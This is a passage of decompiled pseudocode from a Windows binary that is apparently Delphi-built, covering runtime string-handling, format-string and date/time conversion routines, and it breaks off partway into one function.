//----- (004075BC) --------------------------------------------------------
char *__usercall sub_4075BC@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-4h] [ebp-Ch]

  v6 = sub_403724((int)a2);
  v4 = sub_4038E8(a2);
  return sub_407588(a1, v4, v6);
}

//----- (004075E0) --------------------------------------------------------
int __usercall sub_4075E0@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>, int a3@<ecx>)
{
  _BYTE *v3; // edi
  int v5; // ebx
  int result; // eax
  int v7; // ecx
  _BYTE *v8; // edi
  bool v9; // zf
  int v10; // edx

  v3 = a2;
  v5 = a3;
  result = 0;
  if ( a3 )
  {
    do
    {
      if ( !a3 )
        break;
      v9 = *v3++ == 0;
      --a3;
    }
    while ( !v9 );
    v7 = v5 - a3;
    v8 = a2;
    v10 = 0;
    v9 = 1;
    do
    {
      do
      {
        if ( !v7 )
          break;
        v9 = *a1++ == *v8++;
        --v7;
      }
      while ( v9 );
      if ( v9 )
        break;
      LOBYTE(result) = *(a1 - 1);
      if ( (unsigned __int8)result >= 0x61u && (unsigned __int8)result <= 0x7Au )
        LOBYTE(result) = result - 32;
      LOBYTE(v10) = *(v8 - 1);
      if ( (unsigned __int8)v10 >= 0x61u && (unsigned __int8)v10 <= 0x7Au )
        LOBYTE(v10) = v10 - 32;
      result -= v10;
      v9 = result == 0;
    }
    while ( !result );
  }
  return result;
}

//----- (00407628) --------------------------------------------------------
_BYTE *__usercall sub_407628@<eax>(_BYTE *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *v2; // edi
  int v3; // ecx
  bool v4; // zf
  int v5; // ecx
  _BYTE *v6; // edi
  _BYTE *result; // eax

  v2 = a1;
  v3 = -1;
  v4 = 1;
  do
  {
    if ( !v3 )
      break;
    v4 = *v2++ == 0;
    --v3;
  }
  while ( !v4 );
  v5 = ~v3;
  v6 = a1;
  do
  {
    if ( !v5 )
      break;
    v4 = *v6++ == a2;
    --v5;
  }
  while ( !v4 );
  result = 0;
  if ( v4 )
    return v6 - 1;
  return result;
}

//----- (00407648) --------------------------------------------------------
_DWORD *__usercall sub_407648@<eax>(int a1@<eax>)
{
  int v1; // ebx
  _DWORD *v2; // eax

  v1 = a1 + 4;
  v2 = (_DWORD *)sub_402598(a1 + 4);
  *v2 = v1;
  return v2 + 1;
}

//----- (0040765C) --------------------------------------------------------
char *__usercall sub_40765C@<eax>(char *a1@<eax>)
{
  unsigned int v3; // esi
  char *v4; // eax

  if ( !a1 )
    return 0;
  v3 = sub_407534(a1) + 1;
  v4 = (char *)sub_407648(v3);
  return sub_40754C(v4, a1, v3);
}

//----- (00407688) --------------------------------------------------------
_DWORD *__usercall sub_407688@<eax>(int a1@<eax>, unsigned __int8 *a2@<edx>, unsigned int a3@<ecx>)
{
  unsigned int v3; // ebx
  char v7[32]; // [esp+0h] [ebp-34h] BYREF
  char *v8; // [esp+20h] [ebp-14h] BYREF
  char v9; // [esp+24h] [ebp-10h]

  v3 = a3;
  if ( a3 > 0x1F )
    v3 = 31;
  if ( (unsigned __int8)sub_409D38(a2, v3 - 1) == 1 )
    --v3;
  sub_40754C(v7, (char *)a2, v3);
  v7[v3] = 0;
  v8 = v7;
  v9 = 6;
  return sub_406CD4(off_41C14C[a1], (int)&v8, 0);
}
// 41C14C: using guessed type int **off_41C14C[2];
// 407688: using guessed type char var_34[32];

//----- (004076E0) --------------------------------------------------------
volatile __int32 *__usercall sub_4076E0@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>)
{
  return sub_40437C(a1, a2);
}

//----- (004076F4) --------------------------------------------------------
_DWORD *__usercall sub_4076F4@<eax>(_DWORD *a1@<eax>)
{
  return sub_4034C8(a1);
}

//----- (00407700) --------------------------------------------------------
void __userpurge sub_407700(
        unsigned __int8 *a1@<eax>,
        unsigned int a2@<edx>,
        unsigned __int8 *a3@<ecx>,
        int a4,
        int a5,
        int a6)
{
  unsigned __int8 *v6; // edi
  unsigned __int8 *v7; // esi
  unsigned __int8 *v8; // ecx
  unsigned __int8 v9; // al
  int v10; // ebx
  unsigned __int8 v11; // al
  unsigned int v12; // edx
  unsigned __int8 v13; // al
  unsigned int v14; // ecx
  unsigned int v15; // edx
  unsigned int v16; // ebx
  unsigned int v17; // ecx
  unsigned int v18; // ebx
  unsigned int v19; // et0
  bool v20; // cf
  unsigned int v21; // edx
  unsigned __int8 *v22; // edi
  unsigned int v23; // ecx
  unsigned int v24; // [esp-14h] [ebp-8Ch]
  unsigned int v25; // [esp-14h] [ebp-8Ch]
  unsigned __int8 *v26; // [esp-10h] [ebp-88h]
  unsigned __int8 *v27; // [esp+54h] [ebp-24h]
  unsigned int v28; // [esp+5Ch] [ebp-1Ch]
  unsigned __int8 v29; // [esp+63h] [ebp-15h]
  int v30; // [esp+6Ch] [ebp-Ch] BYREF
  int v31; // [esp+70h] [ebp-8h]
  unsigned __int8 *v32; // [esp+74h] [ebp-4h]
  int savedregs; // [esp+78h] [ebp+0h] BYREF

  v6 = a1;
  v7 = a3;
  v8 = &a3[a6];
  v32 = a1;
  v31 = 0;
  v30 = 0;
LABEL_2:
  if ( a2 )
  {
    while ( v7 != v8 )
    {
      v9 = *v7++;
      if ( v9 == 37 )
      {
        if ( v7 == v8 )
          break;
        v9 = *v7++;
        if ( v9 != 37 )
        {
          v10 = (int)(v7 - 2);
          while ( 1 )
          {
            v29 = v9;
            if ( v9 == 45 )
            {
              if ( v7 == v8 )
                goto LABEL_6;
              v9 = *v7++;
            }
            v11 = sub_4077E2(v9, v8, (int)&savedregs, v7);
            if ( v11 != 58 )
              break;
            v31 = v10;
            if ( v7 == v8 )
              goto LABEL_6;
            v9 = *v7++;
          }
          v28 = v10;
          if ( v11 == 46 )
          {
            if ( v7 == v8 )
              break;
            v13 = *v7++;
            v11 = sub_4077E2(v13, v8, (int)&savedregs, v7);
          }
          v27 = v7;
          v26 = v8;
          v24 = v12;
          sub_40782B(v11, (int)&savedregs, (int (*)())v7);
          v15 = v24;
          v16 = v10 - v14;
          if ( v28 < v14 )
            v16 = 0;
          if ( v29 == 45 )
          {
            v15 = v24 - v14;
            if ( v24 < v14 )
            {
              v14 = v24;
              v15 = 0;
            }
            qmemcpy(v6, v7, v14);
            v7 += v14;
            v6 += v14;
            v14 = 0;
          }
          v19 = v14;
          v17 = v16;
          v18 = v19;
          v20 = v15 < v17;
          v21 = v15 - v17;
          if ( v20 )
          {
            v17 += v21;
            v21 = 0;
          }
          memset(v6, 32, v17);
          v22 = &v6[v17];
          v23 = v18;
          v20 = v21 < v18;
          a2 = v21 - v18;
          if ( v20 )
          {
            v23 = a2 + v18;
            a2 = 0;
          }
          qmemcpy(v22, v7, v23);
          v6 = &v22[v23];
          if ( v30 )
          {
            v25 = a2;
            sub_4076F4(&v30);
            a2 = v25;
          }
          v8 = v26;
          v7 = v27;
          goto LABEL_2;
        }
      }
      *v6++ = v9;
      if ( !--a2 )
        break;
    }
  }
LABEL_6:
  sub_407ADD((int)&savedregs);
}
// 40775A: variable 'v8' is possibly undefined
// 40778F: variable 'v12' is possibly undefined
// 407799: variable 'v14' is possibly undefined

//----- (004077E2) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
unsigned __int8 __usercall sub_4077E2@<al>(
        unsigned __int8 result@<al>,
        unsigned __int8 *a2@<ecx>,
        int a3@<ebp>,
        unsigned __int8 *a4@<esi>)
{
  int v4; // ebx

  v4 = 0;
  if ( result == 42 )
  {
    if ( *(_DWORD *)(a3 - 8) <= *(_DWORD *)(a3 + 8) )
      ++*(_DWORD *)(a3 - 8);
    if ( a4 == a2 )
LABEL_12:
      JUMPOUT(0x407736);
    return *a4;
  }
  else
  {
    while ( result >= 0x30u && result <= 0x39u )
    {
      v4 = (unsigned __int8)(result - 48) + 10 * v4;
      if ( a4 == a2 )
        goto LABEL_12;
      result = *a4++;
    }
  }
  return result;
}
// 407806: positive sp value 4 has been found
// 407806: control flows out of bounds to 407736

//----- (0040782B) --------------------------------------------------------
char __usercall sub_40782B@<al>(char a1@<al>, int a2@<ebp>, int (*a3)()@<esi>)
{
  char v3; // cl
  unsigned int v4; // ebx
  signed int v5; // eax
  int v6; // eax
  _DWORD *v7; // ebx
  bool v8; // cf
  _BYTE *v9; // edi
  int v10; // ecx
  bool v11; // zf
  char v12; // bh
  unsigned __int8 v13; // bl
  unsigned int v14; // eax
  unsigned int v15; // edx

  v3 = a1 & 0xDF;
  v4 = *(_DWORD *)(a2 - 8);
  if ( v4 > *(_DWORD *)(a2 + 8) )
    goto LABEL_3;
  ++*(_DWORD *)(a2 - 8);
  a3 = (int (*)())(*(_DWORD *)(a2 + 12) + 8 * v4);
  v5 = *(_DWORD *)a3;
  switch ( *((_BYTE *)a3 + 4) )
  {
    case 0:
      switch ( v3 )
      {
        case 'D':
          if ( v5 < 0 )
          {
            sub_407972(-v5, a2);
            LOBYTE(v5) = 45;
            *((_BYTE *)a3 - 1) = 45;
            return v5;
          }
          goto LABEL_54;
        case 'U':
LABEL_54:
          LOBYTE(v5) = sub_407972(v5, a2);
          return v5;
        case 'X':
LABEL_55:
          JUMPOUT(0x407977);
      }
LABEL_3:
      while ( 1 )
      {
        sub_407ADD(a2);
        v5 = (signed int)sub_407688(v6, *(unsigned __int8 **)(a2 - 20), *(_DWORD *)(a2 - 36) - *(_DWORD *)(a2 - 20));
LABEL_4:
        v7 = (_DWORD *)(a2 - 48);
        *v7 = *(_DWORD *)v5;
        v7[1] = *(_DWORD *)(v5 + 4);
        if ( v3 == 68 )
          break;
        if ( v3 == 85 )
          goto LABEL_51;
        if ( v3 == 88 )
          JUMPOUT(0x4078F0);
      }
      if ( (int)v7[1] < 0 )
      {
        v8 = *v7 != 0;
        *v7 = -*v7;
        v7[1] += v8;
        v7[1] = -v7[1];
        sub_4078EB((int)v7, a2);
        LOBYTE(v5) = 45;
        *((_BYTE *)a3 - 1) = 45;
        return v5;
      }
LABEL_51:
      LOBYTE(v5) = sub_4078EB((int)v7, a2);
      return v5;
    case 1:
    case 7:
    case 8:
    case 9:
    case 0xE:
      goto LABEL_3;
    case 2:
      if ( v3 == 83 )
        return v5;
      goto LABEL_3;
    case 3:
      v12 = 0;
      goto LABEL_39;
    case 4:
      if ( v3 != 83 )
        goto LABEL_3;
      LOBYTE(v5) = *(_BYTE *)v5;
      return v5;
    case 5:
      if ( v3 != 80 )
        goto LABEL_3;
      *(_DWORD *)(a2 - 32) = 8;
      goto LABEL_55;
    case 6:
      if ( v3 != 83 )
        goto LABEL_3;
      v9 = *(_BYTE **)a3;
      LOBYTE(v5) = 0;
      v10 = *(_DWORD *)(a2 - 32);
      if ( v10 )
      {
        do
        {
          if ( !v10 )
            break;
          v11 = *v9++ == 0;
          --v10;
        }
        while ( !v11 );
      }
      return v5;
    case 0xA:
      a3 = (int (*)())sub_4036B0;
      goto LABEL_26;
    case 0xB:
      if ( v3 == 83 )
        return v5;
      goto LABEL_3;
    case 0xC:
      v12 = 1;
LABEL_39:
      a3 = *(int (**)())a3;
      v13 = 0;
      if ( v3 == 71 || (v13 = 1, v3 == 69) )
      {
        v14 = *(_DWORD *)(a2 - 32);
        v15 = 3;
        if ( v14 > 0x12 )
          v14 = 15;
      }
      else
      {
        v13 = 2;
        if ( v3 != 70 )
        {
          v13 = 3;
          if ( v3 != 78 )
          {
            if ( v3 != 77 )
              goto LABEL_3;
            v13 = 4;
          }
        }
        v14 = 18;
        v15 = *(_DWORD *)(a2 - 32);
        if ( v15 > 0x12 )
        {
          v15 = 2;
          if ( v3 == 77 )
            v15 = (unsigned __int8)byte_41E4F0;
        }
      }
      LOBYTE(v5) = sub_40A8EE((_BYTE *)(a2 - 113), (int)a3, v12, v15, v14, v13);
      return v5;
    case 0xD:
      if ( v3 != 83 )
        goto LABEL_3;
      if ( *(_WORD *)v5 > 1u )
        LOBYTE(v5) = (unsigned __int8)sub_4076E0((volatile __int32 *)(a2 - 12), *(VARIANTARG **)a3);
      return v5;
    case 0xF:
      a3 = (int (*)())sub_403710;
LABEL_26:
      if ( v3 != 83 )
        goto LABEL_3;
      ((void (__usercall *)(char **@<eax>, int@<edx>))a3)((char **)(a2 - 16), v5);
      return *(_DWORD *)(a2 - 16);
    case 0x10:
      goto LABEL_4;
  }
}
// 4078CB: control flows out of bounds to 4078F0
// 40795E: control flows out of bounds to 407977
// 4078A5: variable 'v6' is possibly undefined
// 4078BA: variable 'v3' is possibly undefined
// 41E4F0: using guessed type char byte_41E4F0;

//----- (004078EB) --------------------------------------------------------
int __usercall sub_4078EB@<eax>(int a1@<ebx>, int a2@<ebp>)
{
  int v2; // ecx
  int v3; // esi
  unsigned __int8 v4; // dl
  int v5; // eax
  int v6; // edx
  int result; // eax
  unsigned int v8; // ecx
  unsigned int v9; // edx
  bool v10; // cc
  unsigned int v11; // edx
  int v12; // [esp-4h] [ebp-4h]

  v2 = 10;
  v3 = a2 - 81;
  do
  {
    v12 = v2;
    v4 = sub_405775(*(_QWORD *)a1, (unsigned int)v2) + 48;
    if ( v4 >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v3 = v4;
    v5 = sub_405680(*(_QWORD *)a1, (unsigned int)v12);
    v2 = v12;
    *(_DWORD *)a1 = v5;
    *(_DWORD *)(a1 + 4) = v6;
    result = v6 | v5;
  }
  while ( result );
  v8 = a2 - 81 - v3;
  v9 = *(_DWORD *)(a2 - 32);
  if ( v9 <= 0x10 )
  {
    v10 = v9 <= v8;
    v11 = v9 - v8;
    if ( !v10 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v3 = 48;
        --v11;
      }
      while ( v11 );
    }
  }
  return result;
}
// 407922: variable 'v6' is possibly undefined

//----- (00407972) --------------------------------------------------------
unsigned int __usercall sub_407972@<eax>(unsigned int result@<eax>, int a2@<ebp>)
{
  int v2; // esi
  unsigned int v3; // et2
  char v4; // dl
  unsigned int v5; // ecx
  unsigned int v6; // edx
  bool v7; // cc
  unsigned int v8; // edx

  v2 = a2 - 97;
  do
  {
    v3 = result % 0xA;
    result /= 0xAu;
    v4 = v3 + 48;
    if ( (unsigned __int8)(v3 + 48) >= 0x3Au )
      v4 += 7;
    *(_BYTE *)--v2 = v4;
  }
  while ( result );
  v5 = a2 - 97 - v2;
  v6 = *(_DWORD *)(a2 - 32);
  if ( v6 <= 0x10 )
  {
    v7 = v6 <= v5;
    v8 = v6 - v5;
    if ( !v7 )
    {
      LOBYTE(result) = 48;
      do
      {
        *(_BYTE *)--v2 = 48;
        --v8;
      }
      while ( v8 );
    }
  }
  return result;
}

//----- (00407ADD) --------------------------------------------------------
void __usercall sub_407ADD(int a1@<ebp>)
{
  sub_4034C8((_DWORD *)(a1 - 16));
}

//----- (00407AF8) --------------------------------------------------------
unsigned __int8 *__userpurge sub_407AF8@<eax>(
        unsigned __int8 *a1@<eax>,
        unsigned int a2@<edx>,
        char *a3@<ecx>,
        int a4,
        int a5)
{
  int v8; // eax
  int v9; // eax

  v8 = sub_407534(a3);
  sub_407700(a1, a2, (unsigned __int8 *)a3, a4, a5, v8);
  a1[v9] = 0;
  return a1;
}
// 407B1F: variable 'v9' is possibly undefined

//----- (00407B2C) --------------------------------------------------------
_DWORD *__userpurge sub_407B2C@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4)
{
  return sub_407B40(a4, a1, a2, a3);
}

//----- (00407B40) --------------------------------------------------------
_DWORD *__userpurge sub_407B40@<eax>(char **a1@<eax>, unsigned __int8 *a2@<edx>, int a3@<ecx>, int a4)
{
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  int v8; // eax
  unsigned __int8 v10[10]; // [esp+0h] [ebp-100Ah] BYREF
  char **v11; // [esp+Ah] [ebp-1000h]
  int v12; // [esp+1002h] [ebp-8h]
  unsigned __int8 *v13; // [esp+1006h] [ebp-4h]

  v11 = a1;
  v12 = a3;
  v13 = a2;
  v5 = 4098;
  if ( sub_403724((int)a2) >= 3074 )
  {
    v7 = sub_403724((int)v13);
    v5 = v7;
  }
  else
  {
    v6 = sub_403724((int)v13);
    sub_407700(v10, 0x1001u, v13, a4, v12, v6);
  }
  if ( v7 < v5 - 1 )
    return sub_4035B0(a1, (char *)v10, v7);
  while ( v7 >= v5 - 1 )
  {
    v5 *= 2;
    sub_4034C8(a1);
    sub_4039FC(a1, v5);
    v8 = sub_403724((int)v13);
    sub_407700((unsigned __int8 *)*a1, v5 - 1, v13, a4, v12, v8);
  }
  return sub_4039FC(a1, v7);
}
// 407BAD: variable 'v7' is possibly undefined

//----- (00407C08) --------------------------------------------------------
int __userpurge sub_407C08@<eax>(_DWORD *a1@<eax>, double a2)
{
  unsigned __int64 v3; // rax
  int v4; // eax
  int v5; // edx
  unsigned __int64 v6; // rt2
  int v7; // eax
  unsigned __int64 v8; // rt2
  int result; // eax

  v3 = (__int64)(a2 * flt_41C154);
  if ( (v3 & 0x8000000000000000ui64) == 0i64 )
  {
    v8 = v3 % (unsigned int)dword_41C158;
    v7 = v3 / (unsigned int)dword_41C158;
    v5 = v8;
  }
  else
  {
    v6 = -(__int64)v3 % (unsigned __int64)(unsigned int)dword_41C158;
    v4 = -(__int64)v3 / (unsigned __int64)(unsigned int)dword_41C158;
    v5 = v6;
    v7 = -v4;
  }
  result = v7 + 693594;
  *a1 = v5;
  a1[1] = result;
  return result;
}
// 41C154: using guessed type float flt_41C154;
// 41C158: using guessed type int dword_41C158;

//----- (00407C48) --------------------------------------------------------
char __userpurge sub_407C48@<al>(
        unsigned __int16 a1@<ax>,
        unsigned __int16 a2@<dx>,
        unsigned __int16 a3@<cx>,
        double *a4,
        unsigned __int16 a5)
{
  char v6; // [esp+Bh] [ebp-1h]

  v6 = 0;
  if ( a1 < 0x18u && a2 < 0x3Cu && a3 < 0x3Cu && a5 < 0x3E8u )
  {
    *a4 = (double)(a5 + 1000 * a3 + 60000 * a2 + 3600000 * a1) / 86400000.0;
    return 1;
  }
  return v6;
}

//----- (00407CB8) --------------------------------------------------------
double __userpurge sub_407CB8@<st0>(
        unsigned __int16 a1@<ax>,
        unsigned __int16 a2@<dx>,
        unsigned __int16 a3@<cx>,
        unsigned __int16 a4)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v6; // [esp-4h] [ebp-1Ch]
  char *v7; // [esp+Ch] [ebp-Ch] BYREF
  double v8; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v7 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_407D1D;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( !sub_407C48(a1, a2, a3, &v8, a4) )
  {
    sub_404B80(off_41DBA8[0], &v7);
    sub_406CBC((__int32)v7);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_407D24;
  sub_4034C8(&v7);
  return v8;
}
// 41DBA8: using guessed type int **off_41DBA8[18];

//----- (00407D30) --------------------------------------------------------
unsigned int __userpurge sub_407D30@<eax>(_WORD *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5)
{
  unsigned int v9; // [esp+Ch] [ebp-Ch] BYREF
  unsigned __int16 v10; // [esp+14h] [ebp-4h] BYREF
  unsigned __int16 v11; // [esp+16h] [ebp-2h] BYREF

  sub_407C08(&v9, a5);
  sub_406CA0(v9, 0xEA60u, &v11, &v10);
  sub_406CA0(v11, 0x3Cu, a1, a2);
  return sub_406CA0(v10, 0x3E8u, a3, (_WORD *)a4);
}

//----- (00407D8C) --------------------------------------------------------
bool __usercall sub_407D8C@<al>(unsigned __int16 a1@<ax>)
{
  return (a1 & 3) == 0 && (a1 % 0x64u || !(a1 % 0x190u));
}

//----- (00407DC8) --------------------------------------------------------
char __userpurge sub_407DC8@<al>(
        unsigned __int16 a1@<ax>,
        unsigned __int16 a2@<dx>,
        unsigned __int16 a3@<cx>,
        double *a4)
{
  char *v6; // esi
  int v7; // eax
  int v8; // ecx
  char v10; // [esp+11h] [ebp-3h]

  v10 = 0;
  v6 = (char *)&unk_41C0D4 + 24 * (sub_407D8C(a1) & 0x7F);
  if ( a1 && a1 <= 0x270Fu && a2 && a2 <= 0xCu && a3 && a3 <= *(_WORD *)&v6[2 * a2 - 2] )
  {
    v7 = a2 - 1;
    if ( v7 > 0 )
    {
      v8 = 1;
      do
      {
        a3 += *(_WORD *)&v6[2 * v8++ - 2];
        --v7;
      }
      while ( v7 );
    }
    *a4 = (double)(a3 + (a1 - 1) / 400 + (a1 - 1) / 4 + 365 * (a1 - 1) - (a1 - 1) / 100 - 693594);
    return 1;
  }
  return v10;
}

//----- (00407E90) --------------------------------------------------------
double __usercall sub_407E90@<st0>(unsigned __int16 a1@<ax>, unsigned __int16 a2@<dx>, unsigned __int16 a3@<cx>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v5; // [esp-4h] [ebp-1Ch]
  char *v6; // [esp+Ch] [ebp-Ch] BYREF
  double v7; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_407EF0;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( !sub_407DC8(a1, a2, a3, &v7) )
  {
    sub_404B80(off_41DC04[0], &v6);
    sub_406CBC((__int32)v6);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_407EF7;
  sub_4034C8(&v6);
  return v7;
}
// 41DC04: using guessed type int **off_41DC04[5];

//----- (00407F04) --------------------------------------------------------
_WORD *__userpurge sub_407F04@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, int a4, double a5)
{
  int v5; // ecx
  _WORD *result; // eax
  signed int v7; // ecx
  __int16 i; // bx
  __int16 v9; // bx
  __int16 v10; // bx
  unsigned __int16 v11; // bx
  char *v12; // edx
  int v13; // eax
  int v14; // [esp+8h] [ebp-18h] BYREF
  int v15; // [esp+Ch] [ebp-14h]
  unsigned __int16 v16; // [esp+10h] [ebp-10h] BYREF
  unsigned __int16 v17; // [esp+12h] [ebp-Eh] BYREF
  _WORD *v18; // [esp+14h] [ebp-Ch]
  _WORD *v19; // [esp+18h] [ebp-8h]
  unsigned __int16 *v20; // [esp+1Ch] [ebp-4h]

  v18 = a3;
  v19 = a2;
  v20 = a1;
  sub_407C08(&v14, a5);
  v5 = v15;
  if ( v15 > 0 )
  {
    *(_WORD *)a4 = v15 % 7;
    v7 = v5 - 1;
    for ( i = 1; v7 >= 146097; i += 400 )
      v7 -= 146097;
    sub_406CA0(v7, 0x8EACu, &v16, &v17);
    if ( v16 == 4 )
    {
      v16 = 3;
      v17 -= 29012;
    }
    v9 = 100 * v16 + i;
    sub_406CA0(v17, 0x5B5u, &v16, &v17);
    v10 = 4 * v16 + v9;
    sub_406CA0(v17, 0x16Du, &v16, &v17);
    if ( v16 == 4 )
    {
      v16 = 3;
      v17 += 365;
    }
    v11 = v16 + v10;
    v13 = 3 * (sub_407D8C(v11) & 0x7F);
    v12 = (char *)&unk_41C0D4 + 8 * v13;
    LOWORD(v13) = 1;
    while ( 1 )
    {
      v16 = *(_WORD *)&v12[2 * (unsigned __int16)v13 - 2];
      if ( v17 < v16 )
        break;
      v17 -= v16;
      ++v13;
    }
    *v20 = v11;
    *v19 = v13;
    LOWORD(v13) = v17;
    result = (_WORD *)(v13 + 1);
    *v18 = (_WORD)result;
  }
  else
  {
    *v20 = 0;
    *v19 = 0;
    result = v18;
    *v18 = 0;
    *(_WORD *)a4 = 0;
  }
  return result;
}

//----- (00408048) --------------------------------------------------------
_WORD *__userpurge sub_408048@<eax>(unsigned __int16 *a1@<eax>, _WORD *a2@<edx>, _WORD *a3@<ecx>, double a4)
{
  int var2; // [esp+6h] [ebp-2h] BYREF

  return sub_407F04(a1, a2, a3, (int)&var2, a4);
}

//----- (00408068) --------------------------------------------------------
int __stdcall sub_408068(double a1)
{
  _DWORD v2[2]; // [esp+0h] [ebp-8h] BYREF

  sub_407C08(v2, a1);
  return v2[1] % 7 + 1;
}

//----- (00408090) --------------------------------------------------------
double sub_408090()
{
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-18h] BYREF
  double v2; // [esp+18h] [ebp-8h]

  GetLocalTime(&SystemTime);
  v2 = sub_407E90(SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay);
  return sub_407CB8(SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond, SystemTime.wMilliseconds) + v2;
}

//----- (004080E0) --------------------------------------------------------
int __usercall sub_4080E0@<eax>(char *a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // ebx
  int result; // eax

  v3 = 256 - *(_DWORD *)(a3 - 260);
  if ( a2 < v3 )
    v3 = a2;
  if ( v3 )
    sub_4026B0(a1, (char *)(a3 + *(_DWORD *)(a3 - 260) - 256), v3);
  result = a3;
  *(_DWORD *)(a3 - 260) += v3;
  return result;
}

//----- (00408124) --------------------------------------------------------
int __usercall sub_408124@<eax>(char *a1@<eax>, int a2)
{
  int v3; // eax

  v3 = sub_403724((int)a1);
  return sub_4080E0(a1, v3, a2);
}

//----- (00408144) --------------------------------------------------------
int __usercall sub_408144@<eax>(int a1@<eax>, int a2@<edx>, int a3)
{
  int v3; // eax
  int v5; // [esp+8h] [ebp-20h] BYREF
  char v6; // [esp+Ch] [ebp-1Ch]
  int v7; // [esp+10h] [ebp-18h]
  char v8; // [esp+14h] [ebp-14h]
  unsigned __int8 v9[16]; // [esp+18h] [ebp-10h] BYREF

  v5 = a2;
  v6 = 0;
  v7 = a1;
  v8 = 0;
  sub_407700(v9, 0x10u, byte_41C15C, 1, (int)&v5, 4);
  return sub_4080E0((char *)v9, v3, a3);
}
// 408181: variable 'v3' is possibly undefined
// 41C15C: using guessed type unsigned __int8 byte_41C15C[4];

//----- (00408190) --------------------------------------------------------
int __cdecl sub_408190(int a1)
{
  _DWORD *v1; // eax
  int v2; // edx
  int result; // eax

  v1 = (_DWORD *)(a1 - 4);
  v2 = *(_DWORD *)(a1 - 4);
  while ( *(_BYTE *)*v1 == *(_BYTE *)(a1 - 5) )
    ++*v1;
  result = *v1 - v2 + 1;
  *(_DWORD *)(a1 - 12) = result;
  return result;
}

//----- (004081BC) --------------------------------------------------------
int __cdecl sub_4081BC(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 19) )
  {
    sub_408048(
      (unsigned __int16 *)(a1 - 14),
      (_WORD *)(a1 - 16),
      (_WORD *)(a1 - 18),
      *(double *)(*(_DWORD *)(a1 + 8) + 8));
    result = a1;
    *(_BYTE *)(a1 - 19) = 1;
  }
  return result;
}

//----- (004081F4) --------------------------------------------------------
int __cdecl sub_4081F4(int a1)
{
  int result; // eax

  result = a1;
  if ( !*(_BYTE *)(a1 - 29) )
  {
    sub_407D30(
      (_WORD *)(a1 - 22),
      (_WORD *)(a1 - 24),
      (_WORD *)(a1 - 26),
      a1 - 28,
      *(double *)(*(_DWORD *)(a1 + 8) + 8));
    result = a1;
    *(_BYTE *)(a1 - 29) = 1;
  }
  return result;
}

//----- (00408234) --------------------------------------------------------
_DWORD *__usercall sub_408234@<eax>(int a1@<eax>, char **a2@<edx>, int a3)
{
  LCID ThreadLocale_0; // eax
  int v6; // eax
  int v7; // eax
  char *v8; // esi
  int v9; // eax
  char *v11; // [esp-18h] [ebp-138h]
  unsigned int v12[2]; // [esp-Ch] [ebp-12Ch] BYREF
  int *v13; // [esp-4h] [ebp-124h]
  char *v14; // [esp+8h] [ebp-118h] BYREF
  char DateStr[256]; // [esp+Ch] [ebp-114h] BYREF
  SYSTEMTIME Date; // [esp+10Ch] [ebp-14h] BYREF
  char *v17; // [esp+11Ch] [ebp-4h] BYREF
  int savedregs; // [esp+120h] [ebp+0h] BYREF

  v14 = 0;
  v17 = 0;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_408386;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_4034C8(a2);
  Date.wYear = *(_WORD *)(a3 - 14);
  Date.wMonth = *(_WORD *)(a3 - 16);
  Date.wDay = *(_WORD *)(a3 - 18);
  sub_403560((volatile __int32 *)&v17, (__int32)&dword_40839C);
  v11 = sub_4038E8(v17);
  ThreadLocale_0 = GetThreadLocale_0();
  if ( GetDateFormatA(ThreadLocale_0, 4u, &Date, v11, DateStr, 256) )
  {
    sub_4036F8(a2, DateStr, 256);
    if ( a1 == 1 )
    {
      if ( word_41E5AC == 4 )
      {
        if ( word_41E5AE == 1 )
        {
          v7 = sub_403724((int)*a2);
          if ( sub_409D50((int)*a2, v7) == 4 )
          {
            v8 = &DateStr[sub_409E3C((int)*a2, 3) - 1];
            sub_403680(&v14, v8);
            v9 = sub_409EA0((int)v14, 2);
            sub_4035B0(a2, v8, v9);
          }
        }
      }
      else if ( word_41E5AC == 17 )
      {
        v6 = sub_409EA0((int)*a2, 1);
        sub_40392C((int)*a2, 1, v6, a2);
      }
    }
  }
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_40838D;
  sub_4034C8(&v14);
  return sub_4034C8(&v17);
}
// 40839C: using guessed type int dword_40839C;
// 41E5AC: using guessed type __int16 word_41E5AC;
// 41E5AE: using guessed type __int16 word_41E5AE;
// 408234: using guessed type CHAR DateStr[256];

//----- (004083A0) --------------------------------------------------------
_DWORD *__usercall sub_4083A0@<eax>(int a1@<eax>, char **a2@<edx>, int a3)
{
  LCID ThreadLocale_0; // eax
  int v6; // eax
